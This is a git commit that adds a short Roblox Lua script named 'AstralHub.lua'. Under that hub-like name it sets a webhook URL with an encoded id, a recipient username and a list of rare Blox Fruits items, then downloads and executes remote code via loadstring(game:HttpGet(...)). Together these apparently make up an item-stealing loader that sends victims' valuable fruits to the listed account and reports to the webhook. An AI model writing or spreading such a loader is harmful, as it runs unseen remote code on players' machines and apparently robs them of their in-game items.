b283d6e22afa42dff8b704899f1ab02c976f07ab
NaruTeam <naruteamservice@gmail.com>
2025-04-14 23:08:17 +0700

    Create AstralHub.lua

---
+++ AstralHub.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=cmJpcTM4RUwwQU5jdnB1dkZRaWxRdzp3cjNvYjlEcDZtRjRTVm04VjVPU09xNXMwTkxBLXNrV0dXVmlHQUNocDZtZmhmTEZvUkp0UENkdFJCV3F3eEVYMmtJUnhQazJ5TGhiRlRlbUY2Rzh2MWN1NEl0RW8zaUI1b3NfMGR2bGNJRzh1VTYxTUhNLUxXWGt3Yk1SYTJuVktTSUItckFXaHgzOFdEdUU5bHVtN0JTU2ZyMDd1TkxWZTZaeHBRWFJ6dDQ"
+Usernames = {"Martinzaza121"}
+FruitsToHit = {"Kitsune-Kitsune", "Yeti-Yeti", "Gas-Gas"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
